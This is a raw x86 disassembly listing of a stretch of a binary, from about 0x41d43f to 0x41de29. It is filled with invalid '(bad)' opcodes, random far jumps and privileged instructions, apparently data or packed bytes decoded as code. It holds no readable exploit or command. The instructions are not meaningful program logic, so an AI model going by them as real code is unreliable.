  41d43f:	dec    ebp
  41d440:	cs out 0x61,eax
  41d443:	mov    esi,edi
  41d445:	lock xor eax,0xbd0aef8b
  41d44b:	retf   0xc54d
  41d44e:	(bad)  
  41d44f:	es push cs
  41d451:	add    DWORD PTR [eax],0xffffffcf
  41d454:	mov    esp,eax
  41d456:	outs   dx,BYTE PTR ds:[esi]
  41d457:	or     bl,BYTE PTR [edx-0x1b]
  41d45a:	jb     0x41d463
  41d45c:	dec    esp
  41d45d:	mov    dh,bl
  41d45f:	push   ds
  41d460:	dec    BYTE PTR [esi+edx*8]
  41d463:	js     0x41d4c0
  41d465:	push   0xe841ccea
  41d46a:	adc    al,cl
  41d46c:	sbb    dh,BYTE PTR [edx*2+0x3fcc97bb]
  41d473:	cmp    esi,ebx
  41d475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d476:	pop    es
  41d477:	pop    esi
  41d478:	pop    ds
  41d479:	jmp    0x41d49c
  41d47b:	scas   al,BYTE PTR es:[edi]
  41d47c:	mov    ds:0x60146f32,eax
  41d481:	jbe    0x41d4af
  41d483:	dec    ebp
  41d484:	pop    edi
  41d485:	pop    edx
  41d486:	or     BYTE PTR [ecx-0x1abc3a1b],ah
  41d48c:	jbe    0x41d4b3
  41d48e:	adc    BYTE PTR [ecx+0x21],ch
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd009:0x56851789
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0x6e000001
  41d50d:	push   es
  41d50e:	in     al,0x9f
  41d510:	mov    bl,0xc5
  41d512:	ins    DWORD PTR es:[edi],dx
  41d513:	idiv   DWORD PTR [edi-0x761d2fd1]
  41d519:	(bad)
  41d51c:	inc    esp
  41d51d:	loopne 0x41d594
  41d51f:	jns    0x41d50c
  41d521:	or     bl,bl
  41d523:	inc    edx
  41d524:	inc    ebp
  41d525:	stos   DWORD PTR es:[edi],eax
  41d526:	and    edx,esp
  41d528:	int    0xe3
  41d52a:	push   ecx
  41d52b:	daa    
  41d52c:	xchg   ecx,eax
  41d52d:	inc    ebp
  41d52e:	jg     0x41d4b3
  41d530:	and    eax,0xde0220a8
  41d535:	dec    edx
  41d536:	xor    eax,0xd5316f74
  41d53b:	add    al,0x8c
  41d53d:	outs   dx,BYTE PTR ds:[esi]
  41d53e:	ret    
  41d53f:	jle    0x41d51b
  41d541:	fidivr WORD PTR [edi]
  41d543:	dec    esp
  41d544:	test   eax,0x6f756e5c
  41d549:	addr16 (bad) 
  41d54b:	in     al,dx
  41d54c:	call   0xbec731dc
  41d551:	fisub  DWORD PTR [ecx+edx*2+0x4cbd729d]
  41d558:	(bad)  
  41d559:	int3   
  41d55a:	pusha  
  41d55b:	sbb    al,BYTE PTR [eax+0x59]
  41d55e:	lods   al,BYTE PTR ds:[esi]
  41d55f:	or     edx,ebx
  41d561:	gs dec ebx
  41d563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d564:	sbb    BYTE PTR [edx+eax*8],dh
  41d567:	test   BYTE PTR [eax+0x407146e9],ch
  41d56d:	imul   edi,DWORD PTR [ecx+edi*2],0x5b
  41d571:	sub    DWORD PTR [edi+0x7f],ecx
  41d574:	stos   DWORD PTR es:[edi],eax
  41d575:	jno    0x41d57d
  41d577:	xchg   edx,eax
  41d578:	push   esi
  41d579:	xchg   esp,eax
  41d57a:	cmc    
  41d57b:	or     bh,bl
  41d57d:	xchg   edx,eax
  41d57e:	add    eax,0x937560ff
  41d583:	call   0x1915:0xa1db05b
  41d58a:	test   al,0x68
  41d58c:	mov    ebp,0x6a9daa33
  41d591:	(bad)  
  41d592:	imul   ebp,DWORD PTR [esi],0x9
  41d595:	adc    DWORD PTR [ecx+0x6cd78456],ecx
  41d59b:	jl     0x41d574
  41d59d:	enter  0xfee6,0x82
  41d5a1:	test   al,0x84
  41d5a3:	clc    
  41d5a4:	into   
  41d5a5:	or     al,BYTE PTR [bp+di+0x72]
  41d5a9:	xchg   BYTE PTR [ebp+0x2],cl
  41d5ac:	or     edx,ecx
  41d5ae:	std    
  41d5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b0:	mov    esp,0x17289d67
  41d5b5:	daa    
  41d5b6:	jecxz  0x41d619
  41d5b8:	push   esp
  41d5b9:	push   DWORD PTR [ebp-0x77743a2f]
  41d5bf:	push   cs
  41d5c0:	pop    eax
  41d5c1:	std    
  41d5c2:	outs   dx,BYTE PTR ds:[esi]
  41d5c3:	cld    
  41d5c4:	out    0xe7,al
  41d5c6:	sbb    eax,0x8aeda79d
  41d5cb:	stc    
  41d5cc:	xchg   edx,eax
  41d5cd:	inc    ebx
  41d5ce:	je     0x41d5db
  41d5d0:	pop    eax
  41d5d1:	mov    bl,0xa
  41d5d3:	loopne 0x41d5c2
  41d5d5:	mov    esi,0x4b1485a8
  41d5da:	cmp    eax,ebx
  41d5dc:	pop    esp
  41d5dd:	sub    ah,BYTE PTR [ebx]
  41d5df:	test   esp,0xf25bae2c
  41d5e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5e6:	mov    cl,0x7a
  41d5e8:	jb     0x41d5cc
  41d5ea:	dec    DWORD PTR [ecx]
  41d5ec:	int    0x9a
  41d5ee:	aas    
  41d5ef:	popf   
  41d5f0:	je     0x41d670
  41d5f2:	mov    ch,0xff
  41d5f4:	mov    ds:0x22abad9c,al
  41d5f9:	(bad)  
  41d5fb:	and    ah,bh
  41d5fd:	mov    ds:0x4c6c63db,al
  41d602:	push   ss
  41d603:	aaa    
  41d604:	push   ss
  41d605:	push   ebx
  41d606:	daa    
  41d607:	lods   al,BYTE PTR ds:[esi]
  41d608:	jmp    0x8f9c:0xf70332fc
  41d60f:	lods   al,BYTE PTR ds:[esi]
  41d610:	retf   0x0
	...
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x3c66e435
  41d681:	xor    al,dh
  41d683:	test   ebp,edx
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR ds:0x76000001,al
  41d68d:	dec    ecx
  41d68e:	je     0x41d676
  41d690:	cmp    esp,DWORD PTR [ebp+0x64]
  41d693:	aaa    
  41d694:	lods   eax,DWORD PTR ds:[esi]
  41d695:	push   ss
  41d696:	sahf   
  41d697:	sti    
  41d698:	pop    esp
  41d699:	loopne 0x41d68d
  41d69b:	jmp    0x2b56:0x7e1ad3b5
  41d6a2:	inc    ebx
  41d6a3:	mov    edi,0x4691d0c8
  41d6a8:	jnp    0x41d68b
  41d6aa:	mov    ah,0x1c
  41d6ac:	inc    edx
  41d6ad:	or     DWORD PTR [ebx+0x3e],eax
  41d6b0:	xchg   ecx,eax
  41d6b1:	mov    dl,0x2a
  41d6b3:	inc    esp
  41d6b4:	outs   dx,BYTE PTR ds:[esi]
  41d6b5:	imul   edi,DWORD PTR [ecx-0x6],0x52
  41d6b9:	jmp    0x41d681
  41d6bb:	jge    0x41d689
  41d6bd:	scas   eax,DWORD PTR es:[edi]
  41d6be:	cmp    al,0xe6
  41d6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6c1:	fnsave [ecx]
  41d6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6c4:	push   esp
  41d6c5:	push   eax
  41d6c6:	jns    0x41d65d
  41d6c8:	xchg   ebx,eax
  41d6c9:	addr16 cld 
  41d6cb:	xchg   esi,eax
  41d6cc:	or     ebx,DWORD PTR ds:0x60d3c7ca
  41d6d2:	mov    al,ds:0xc0f355b2
  41d6d7:	push   cs
  41d6d8:	lea    esi,[ebx+0x13]
  41d6db:	jno    0x41d6d4
  41d6dd:	or     ch,cl
  41d6df:	fidivr WORD PTR [esi-0x42]
  41d6e2:	pop    esp
  41d6e3:	fldcw  WORD PTR [eax]
  41d6e5:	mov    dh,0x4d
  41d6e7:	bound  ecx,QWORD PTR [eax+0x1f]
  41d6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6eb:	mov    cl,0x98
  41d6ed:	ss in  eax,0xa7
  41d6f0:	call   0xcd79:0x4da8bcd8
  41d6f7:	sub    eax,0x9c5d6b0b
  41d6fc:	lods   al,BYTE PTR ds:[esi]
  41d6fd:	xchg   edx,eax
  41d6fe:	sbb    DWORD PTR [ebx],0x72
  41d701:	pop    edi
  41d702:	cmp    bh,dl
  41d704:	dec    ecx
  41d705:	cmc    
  41d706:	das    
  41d707:	xchg   ecx,eax
  41d708:	push   0x19fafa7
  41d70d:	push   edx
  41d70e:	sub    ebx,edi
  41d710:	sbb    ecx,DWORD PTR [ebp+0x16]
  41d713:	push   0x65dcaceb
  41d718:	push   esp
  41d719:	jns    0x41d6a3
  41d71b:	jnp    0x41d70c
  41d71d:	shl    BYTE PTR [ebp-0x40],cl
  41d720:	es mov bl,bl
  41d723:	in     eax,0xb1
  41d725:	(bad)  
  41d726:	jecxz  0x41d6e0
  41d728:	mov    dl,0x51
  41d72a:	adc    edx,ebp
  41d72c:	add    ah,BYTE PTR [ebx-0x6e1a7e53]
  41d732:	frstor [esp+esi*8]
  41d735:	dec    edi
  41d736:	sub    eax,0x4d47c5f7
  41d73b:	or     edx,DWORD PTR [eax]
  41d73d:	or     eax,0xcc156d63
  41d742:	leave  
  41d743:	(bad)  
  41d744:	loope  0x41d799
  41d746:	icebp  
  41d747:	bound  esi,QWORD PTR [ebx+0x2483a86f]
  41d74d:	mov    edx,0x7ff37884
  41d752:	data16 shr BYTE PTR [ebp+0x329e087c],1
  41d759:	xchg   edx,eax
  41d75a:	gs dec ecx
  41d75c:	mov    ebx,0x93862bef
  41d761:	push   esi
  41d762:	bound  eax,QWORD PTR [edi+0x47cd4c17]
  41d768:	and    al,0xba
  41d76a:	outs   dx,DWORD PTR ds:[esi]
  41d76b:	call   0xf7f20be7
  41d770:	or     eax,0x5fd5be04
  41d775:	pop    edi
  41d776:	pop    ss
  41d777:	xchg   esp,eax
  41d778:	out    dx,al
  41d779:	out    dx,eax
  41d77a:	(bad)  
  41d77b:	and    al,BYTE PTR [ebx]
  41d77d:	and    BYTE PTR [esi-0x49a03588],0xf9
  41d784:	jbe    0x41d7c7
  41d786:	(bad)  
  41d788:	jg     0x41d798
  41d78a:	fmul   QWORD PTR [eax-0x3370e23a]
  41d790:	fadd   DWORD PTR [eax]
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	pusha  
  41d801:	ret    
  41d802:	cwde   
  41d803:	mov    edx,ebx
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0x17000001,al
  41d80d:	in     eax,0x30
  41d80f:	aas    
  41d810:	jo     0x41d828
  41d812:	push   eax
  41d813:	mov    edi,DWORD PTR [eax]
  41d815:	xchg   DWORD PTR [ebp+0x76],ebp
  41d818:	or     ch,BYTE PTR [edi]
  41d81a:	daa    
  41d81b:	cmp    cl,al
  41d81d:	jnp    0x41d873
  41d81f:	push   ds
  41d820:	push   0xfffffff2
  41d822:	mov    ah,0x7
  41d824:	shl    BYTE PTR es:[eax],cl
  41d827:	test   al,0x13
  41d829:	(bad)  
  41d82a:	(bad)  
  41d82b:	push   ebx
  41d82c:	pop    ebp
  41d82d:	es mov edi,esi
  41d830:	aam    0xbe
  41d832:	and    edx,DWORD PTR [esp+edx*2]
  41d835:	ins    BYTE PTR es:[edi],dx
  41d836:	push   eax
  41d837:	mov    al,0x97
  41d839:	sbb    bl,dh
  41d83b:	and    al,0x78
  41d83d:	mov    esp,0x22df4e27
  41d842:	(bad)  
  41d843:	fisub  DWORD PTR [edx]
  41d845:	jno    0x41d7d6
  41d847:	adc    BYTE PTR ds:0x86817b0f,al
  41d84d:	jmp    FWORD PTR [ebx+edi*1]
  41d850:	cmp    al,0x6
  41d852:	and    cl,dh
  41d854:	icebp  
  41d855:	push   edi
  41d856:	jnp    0x41d883
  41d858:	pusha  
  41d859:	nop
  41d85a:	(bad)  [ebp-0x16]
  41d85d:	sti    
  41d85e:	ins    DWORD PTR es:[edi],dx
  41d85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d860:	sbb    DWORD PTR [edi-0x3e],esi
  41d863:	push   eax
  41d864:	or     eax,0x393d260d
  41d869:	(bad)  
  41d86a:	vpsllq ymm6,ymm3,xmm2
  41d86e:	lds    ebp,FWORD PTR [eax-0x42]
  41d871:	je     0x41d80b
  41d873:	jmp    0x41d82c
  41d875:	inc    ecx
  41d876:	out    dx,al
  41d877:	sub    eax,0x84bfba02
  41d87c:	fsubr  QWORD PTR [edx+0x43]
  41d87f:	cs pusha 
  41d881:	outs   dx,BYTE PTR ds:[esi]
  41d882:	(bad)  [eax+0x6af9b8d9]
  41d888:	mov    edx,0x58858961
  41d88d:	cmp    al,0x93
  41d88f:	pop    edi
  41d890:	cld    
  41d891:	fisubr DWORD PTR [edi+0x3c]
  41d894:	or     BYTE PTR [eax],cl
  41d896:	xchg   ebx,eax
  41d897:	push   ds
  41d898:	pushf  
  41d899:	mov    eax,DWORD PTR [eax]
  41d89b:	call   0xb2d7:0x988e77ba
  41d8a2:	pop    ds
  41d8a3:	stos   BYTE PTR es:[edi],al
  41d8a4:	retf   
  41d8a5:	sub    BYTE PTR [ebx+eiz*4],al
  41d8a8:	popa   
  41d8a9:	xchg   edx,eax
  41d8aa:	mov    bh,0x74
  41d8ac:	sti    
  41d8ad:	mov    esi,0xe43ae57f
  41d8b2:	sub    eax,0x2dd00fd2
  41d8b7:	push   0xffffff95
  41d8b9:	iret   
  41d8ba:	imul   esi,DWORD PTR [edx],0xffffff83
  41d8bd:	cmp    ecx,esp
  41d8bf:	imul   esi,DWORD PTR [ecx+esi*2+0x4e],0x2e
  41d8c4:	jne    0x41d88b
  41d8c6:	mov    eax,0x60b4d01b
  41d8cb:	push   edi
  41d8cc:	into   
  41d8cd:	sbb    eax,DWORD PTR [esi*2-0x195f9d93]
  41d8d4:	pop    ecx
  41d8d5:	and    BYTE PTR [esi-0x433fa26],bl
  41d8db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8dc:	mov    ecx,0xde17df31
  41d8e1:	sbb    bh,ah
  41d8e3:	adc    edx,edi
  41d8e5:	fs mov bh,0x3d
  41d8e8:	adc    BYTE PTR [esp+ebp*4],dl
  41d8eb:	pop    ebp
  41d8ec:	ret    
  41d8ed:	xchg   ebx,eax
  41d8ee:	enter  0xf5bd,0xec
  41d8f2:	pop    ebp
  41d8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8f4:	push   edi
  41d8f5:	pop    ss
  41d8f6:	xchg   edx,eax
  41d8f7:	cdq    
  41d8f8:	pop    eax
  41d8f9:	fist   DWORD PTR ds:0x7af02067
  41d8ff:	and    edi,DWORD PTR [ebp-0x656e7d06]
  41d905:	adc    BYTE PTR [eax+eiz*4],dh
  41d908:	in     al,dx
  41d909:	cli    
  41d90a:	add    DWORD PTR [edi+ecx*4+0x79],esi
  41d90e:	xchg   ebx,eax
  41d90f:	stc    
  41d910:	adc    DWORD PTR [eax],eax
	...
  41d972:	add    BYTE PTR [eax],al
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs int3 
  41d981:	cmp    ebp,ebp
  41d983:	xchg   ebp,eax
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0x5e000001
  41d98d:	xor    BYTE PTR [esi+0x79],dl
  41d990:	cwde   
  41d991:	sbb    BYTE PTR [eax-0x48d9f87b],ah
  41d997:	and    al,0xb9
  41d999:	sbb    edi,DWORD PTR [edi]
  41d99b:	xchg   ebx,eax
  41d99c:	and    bl,dl
  41d99e:	jmp    0x3c34:0x2d02ac3f
  41d9a5:	scas   al,BYTE PTR es:[edi]
  41d9a6:	sub    esp,DWORD PTR [edx+0x457f2085]
  41d9ac:	test   DWORD PTR [ecx-0x505285af],0xb7c1edb9
  41d9b6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41d9b8:	push   ecx
  41d9b9:	jmp    0x41d9e1
  41d9bb:	clc    
  41d9bc:	ds jmp 0x85b8:0xa1ab9c0a
  41d9c4:	dec    esi
  41d9c5:	dec    esi
  41d9c6:	sub    al,0x99
  41d9c8:	popa   
  41d9c9:	call   0x19028bef
  41d9ce:	xchg   esp,eax
  41d9cf:	xchg   ebp,eax
  41d9d0:	loop   0x41d9d3
  41d9d2:	add    eax,0xcacfabe6
  41d9d7:	in     eax,0x1e
  41d9d9:	bound  eax,QWORD PTR [esi-0x1c]
  41d9dc:	inc    ebp
  41d9dd:	dec    ebx
  41d9de:	test   eax,0x9502dc1
  41d9e3:	or     BYTE PTR [eax-0x2685c4f2],al
  41d9e9:	ret    0x50a5
  41d9ec:	and    eax,0x997fa04c
  41d9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9f2:	and    ecx,edi
  41d9f4:	sahf   
  41d9f5:	hlt    
  41d9f6:	or     al,0x88
  41d9f8:	in     eax,dx
  41d9f9:	test   eax,0x8cf593f0
  41d9fe:	mov    ecx,0xc678e6ed
  41da03:	jg     0x41da76
  41da05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da06:	test   BYTE PTR [ebx],bl
  41da08:	gs xchg ecx,eax
  41da0a:	pop    ebx
  41da0b:	or     DWORD PTR [edx-0x4da2a232],edi
  41da11:	int3   
  41da12:	cwde   
  41da13:	vhaddps ymm3,ymm7,YMMWORD PTR [edi+0x56]
  41da19:	dec    edx
  41da1a:	mov    eax,ds:0xa3dceec0
  41da1f:	inc    esi
  41da20:	and    BYTE PTR ds:0x4a593a50,al
  41da26:	lea    esp,[ebx+0x7b818bc3]
  41da2c:	xor    eax,0x47047cd6
  41da31:	(bad)  
  41da32:	pop    eax
  41da33:	add    edi,0x1b628045
  41da39:	sub    bl,cl
  41da3b:	out    0x75,al
  41da3d:	popa   
  41da3e:	adc    dh,dl
  41da40:	ret    0x4bac
  41da43:	fs jmp 0x96dc8bd7
  41da49:	leave  
  41da4a:	call   0x691d1f9b
  41da4f:	aad    0xee
  41da51:	out    dx,eax
  41da52:	xchg   edi,eax
  41da53:	add    edi,DWORD PTR [edi-0x35]
  41da56:	aas    
  41da57:	and    eax,0x6357ec72
  41da5c:	ror    BYTE PTR gs:0xd3fbadce,0xcc
  41da64:	das    
  41da65:	lods   eax,DWORD PTR ds:[esi]
  41da66:	loop   0x41da31
  41da68:	or     bl,BYTE PTR [ecx+0x5198997e]
  41da6e:	and    eax,0x4717bcba
  41da73:	cmp    BYTE PTR [esi],dh
  41da75:	and    edx,DWORD PTR [ebp-0x329c39d2]
  41da7b:	(bad)  
  41da7c:	outs   dx,BYTE PTR ds:[esi]
  41da7d:	outs   dx,DWORD PTR ds:[esi]
  41da7e:	adc    BYTE PTR fs:[ecx+0x40],cl
  41da82:	sbb    bh,BYTE PTR [edi]
  41da84:	cmp    cl,BYTE PTR [esi]
  41da86:	push   esi
  41da87:	inc    DWORD PTR [ebx-0x16]
  41da8a:	xchg   esi,eax
  41da8b:	cmp    BYTE PTR ds:0xb8615415,ah
	...
  41daf1:	add    BYTE PTR [eax],al
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x35
  41db01:	xor    edx,eax
  41db03:	dec    edi
  41db04:	in     al,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xff000001
  41db0d:	jmp    0x706c:0x33995d8b
  41db14:	(bad)  
  41db16:	dec    esp
  41db17:	xchg   DWORD PTR [ebp+0x5fc94ad5],ebx
  41db1d:	sar    DWORD PTR ds:[esp+ebx*8+0x37],0xbb
  41db23:	dec    ebp
  41db24:	push   edi
  41db25:	ret    
  41db26:	sbb    cl,dl
  41db28:	xor    DWORD PTR [ebp-0x37],0x90940949
  41db2f:	or     edi,eax
  41db31:	push   ebx
  41db32:	test   BYTE PTR [edi+eax*2-0x15e468b8],dl
  41db39:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41db3b:	push   0xffffff86
  41db3d:	scas   al,BYTE PTR es:[edi]
  41db3e:	mov    BYTE PTR [ecx-0x63],ah
  41db41:	std    
  41db42:	sar    BYTE PTR [edx],cl
  41db44:	mov    ds:0xee007b33,eax
  41db49:	xchg   edx,eax
  41db4a:	mov    ebx,0x43eb83d5
  41db4f:	mov    eax,ds:0x9cf8356a
  41db54:	mov    ebp,DWORD PTR [edx+0x1d70dc51]
  41db5a:	or     esi,DWORD PTR [esi-0xd]
  41db5d:	jne    0x41db68
  41db5f:	mov    ah,0x65
  41db61:	pop    esp
  41db62:	dec    edi
  41db63:	sub    eax,0x280e91c6
  41db68:	fwait
  41db69:	lds    ebx,FWORD PTR ds:0x59dd9b3d
  41db6f:	mov    ecx,0x57abf18b
  41db74:	es and esi,edx
  41db77:	cmp    eax,DWORD PTR [ebx+0x7221c100]
  41db7d:	call   0x3991:0xa52eb360
  41db84:	add    al,0x36
  41db86:	dec    ecx
  41db87:	cmp    BYTE PTR [eax],bl
  41db89:	sahf   
  41db8a:	sub    DWORD PTR [edi-0x77b2ee97],eax
  41db90:	cli    
  41db91:	test   eax,0x8a8bacc8
  41db96:	popa   
  41db97:	in     al,0xf
  41db99:	rcl    DWORD PTR [edi],1
  41db9b:	sbb    DWORD PTR [eax+0xea31c3c],0x59
  41dba2:	ret    
  41dba3:	mov    dh,0x4f
  41dba5:	sub    al,0x82
  41dba7:	scas   al,BYTE PTR es:[edi]
  41dba8:	jbe    0x41db5d
  41dbaa:	cmp    edx,ebp
  41dbac:	or     al,0xaa
  41dbae:	mov    eax,0x9a5d653f
  41dbb3:	mov    eax,ds:0x8922bc2a
  41dbb8:	xchg   DWORD PTR [eax+0x2],esi
  41dbbb:	scas   eax,DWORD PTR es:[edi]
  41dbbc:	icebp  
  41dbbd:	push   ebx
  41dbbe:	cdq    
  41dbbf:	pop    ebp
  41dbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbc1:	jnp    0x41db88
  41dbc3:	push   esi
  41dbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbc5:	shr    BYTE PTR es:[esi-0x49761415],1
  41dbcc:	iret   
  41dbcd:	das    
  41dbce:	mov    edx,0xd5f5d196
  41dbd3:	test   eax,0x6e77d9a1
  41dbd8:	inc    edx
  41dbd9:	and    al,BYTE PTR [ecx]
  41dbdb:	lds    edx,FWORD PTR [eax-0x55339eb7]
  41dbe1:	push   0xffffffd8
  41dbe3:	push   edx
  41dbe4:	push   edi
  41dbe5:	cli    
  41dbe6:	xchg   esi,eax
  41dbe7:	add    al,0xe0
  41dbe9:	jb     0x41dc0a
  41dbeb:	cwde   
  41dbec:	add    cl,BYTE PTR [eax+0x22]
  41dbef:	dec    esp
  41dbf0:	push   esp
  41dbf1:	or     ecx,ecx
  41dbf3:	jmp    0x3203:0xf1f43445
  41dbfa:	rcl    dh,0x33
  41dbfd:	call   DWORD PTR [ebx-0x57]
  41dc00:	mov    ch,0x25
  41dc02:	or     DWORD PTR [ebx+0x70],ebx
  41dc05:	lahf   
  41dc06:	retf   
  41dc07:	retf   0xfaee
  41dc0a:	xor    DWORD PTR [edx+ebx*1],0xffffffd5
  41dc0e:	push   ecx
  41dc0f:	and    DWORD PTR [edi+0x0],ebp
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0x79b0d050]
  41dc81:	push   ebp
  41dc82:	add    eax,0x13ce919
  41dc87:	add    BYTE PTR ds:0x6b000001,al
  41dc8d:	push   edx
  41dc8e:	xchg   ecx,eax
  41dc8f:	in     al,dx
  41dc90:	enter  0x4fe9,0x4e
  41dc94:	xlat   BYTE PTR ds:[ebx]
  41dc95:	out    dx,eax
  41dc96:	add    eax,0x3bbbeb35
  41dc9b:	sub    DWORD PTR [ecx],0x84229091
  41dca1:	pop    esi
  41dca2:	repz sub BYTE PTR [esi+ecx*1+0x6],0x83
  41dca8:	retf   
  41dca9:	fst    DWORD PTR [ebx]
  41dcab:	out    0x58,eax
  41dcad:	aam    0xd3
  41dcaf:	mov    ch,0xda
  41dcb1:	and    DWORD PTR ds:0xc7d3b6e1,ecx
  41dcb7:	inc    ebx
  41dcb8:	loop   0x41dce1
  41dcba:	enter  0xcedc,0x4a
  41dcbe:	sbb    cl,al
  41dcc0:	add    BYTE PTR [ebx],0xf2
  41dcc3:	pop    DWORD PTR [esi]
  41dcc5:	imul   eax,DWORD PTR [edx],0xffffff93
  41dcc8:	(bad)  
  41dcca:	adc    al,0xf1
  41dccc:	test   eax,0xee7937a0
  41dcd1:	daa    
  41dcd2:	inc    ecx
  41dcd3:	dec    ebp
  41dcd4:	mov    eax,ds:0xa4f50bbc
  41dcd9:	fmul   QWORD PTR [edi+0x24]
  41dcdc:	addr16 lock jnp 0x41dd3f
  41dce0:	icebp  
  41dce1:	jecxz  0x41dcef
  41dce3:	(bad)
  41dce6:	loop   0x41dd3c
  41dce8:	push   ds
  41dce9:	dec    esp
  41dcea:	leave  
  41dceb:	test   DWORD PTR [edi+0xb0ef286],edx
  41dcf1:	pop    esi
  41dcf2:	sti    
  41dcf3:	mov    esi,0xcac715ce
  41dcf8:	sti    
  41dcf9:	xlat   BYTE PTR ds:[ebx]
  41dcfa:	bound  ecx,QWORD PTR [esp+eiz*2-0x42e8467a]
  41dd01:	pop    ecx
  41dd02:	add    dh,BYTE PTR [ebx+0x7b95e4cd]
  41dd08:	das    
  41dd09:	test   DWORD PTR [esi-0x3c],0x91fb8e09
  41dd10:	adc    ah,ah
  41dd12:	les    esi,FWORD PTR [ecx+0x63ae0c50]
  41dd18:	sub    dh,BYTE PTR [esi+esi*8+0x3a]
  41dd1c:	inc    edx
  41dd1d:	mul    DWORD PTR ds:0xd68bf375
  41dd23:	imul   edi,DWORD PTR ds:[esi-0x46],0xffffff8b
  41dd28:	ds in  al,dx
  41dd2a:	imul   eax,DWORD PTR [eax],0xffffffeb
  41dd2d:	rcr    esi,0xaa
  41dd30:	les    ebx,FWORD PTR [ebx+eiz*4-0x792046c6]
  41dd37:	dec    edx
  41dd38:	add    eax,0xa407a92d
  41dd3d:	mov    ds,WORD PTR [esi]
  41dd3f:	out    0xb7,al
  41dd41:	outs   dx,BYTE PTR ds:[esi]
  41dd42:	test   DWORD PTR [edx],edx
  41dd44:	xchg   edx,eax
  41dd45:	push   es
  41dd46:	push   fs
  41dd48:	int3   
  41dd49:	and    esp,esp
  41dd4b:	add    DWORD PTR [edx-0x12],esi
  41dd4e:	rcl    BYTE PTR [ebp+0x41],1
  41dd51:	ja     0x41dd4f
  41dd53:	xchg   esp,eax
  41dd54:	inc    eax
  41dd55:	in     eax,dx
  41dd56:	inc    edi
  41dd57:	jge    0x41dd45
  41dd59:	inc    esp
  41dd5a:	cs jnp 0x41dd9a
  41dd5d:	and    DWORD PTR [eax],edi
  41dd5f:	fwait
  41dd60:	pop    ecx
  41dd61:	cdq    
  41dd62:	sub    esp,esp
  41dd64:	fcmovbe st,st(5)
  41dd66:	jo     0x41dd6c
  41dd68:	(bad)  
  41dd69:	icebp  
  41dd6a:	(bad)  
  41dd6b:	iret   
  41dd6c:	or     edx,DWORD PTR ds:0x9e20d5f3
  41dd72:	cli    
  41dd73:	sub    dx,sp
  41dd76:	cmp    eax,0x5fb05931
  41dd7b:	sub    DWORD PTR [ecx+esi*4-0xe],ebp
  41dd7f:	xor    esi,DWORD PTR [eax+0x69]
  41dd82:	std    
  41dd83:	scas   eax,DWORD PTR es:[edi]
  41dd84:	dec    edx
  41dd85:	mov    ds:0xb0669b1,al
  41dd8a:	inc    esp
  41dd8b:	fisub  WORD PTR [ecx]
  41dd8d:	jge    0x41ddda
  41dd8f:	adc    DWORD PTR [ecx+0x0],ecx
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	xchg   ebx,eax
  41de01:	ret    
  41de02:	xor    esp,DWORD PTR [ebp-0x12]
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	inc    ecx
  41de0d:	pop    ecx
  41de0e:	stos   BYTE PTR es:[edi],al
  41de0f:	ins    DWORD PTR es:[edi],dx
  41de10:	add    BYTE PTR [esi+0x34ffb6c6],ch
  41de16:	cdq    
  41de17:	or     eax,0xd4bf0e35
  41de1c:	or     ecx,ecx
  41de1e:	cmp    ebp,ebp
  41de20:	xor    ebp,DWORD PTR [eax-0x24c68c89]
  41de26:	sub    ecx,0xffffffac
  41de29:	pop    esp
